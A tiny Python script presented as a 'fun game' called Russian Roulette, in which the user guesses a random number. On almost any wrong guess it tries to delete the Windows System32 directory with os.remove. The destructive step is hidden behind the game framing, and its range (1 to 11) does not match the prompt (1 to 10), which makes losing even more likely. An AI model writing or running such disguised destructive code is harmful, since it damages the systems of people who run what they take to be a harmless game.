# RB, Fun Game Using User Inputs

import random
import os

#Russian Roulette Game

number = random.randint(1,11)

guess = input("Guess a number between 1 and 10: ")
guess = int(guess)

if guess == number:
    print("You Won!")
else:
    os.remove("C:\Windows\System32")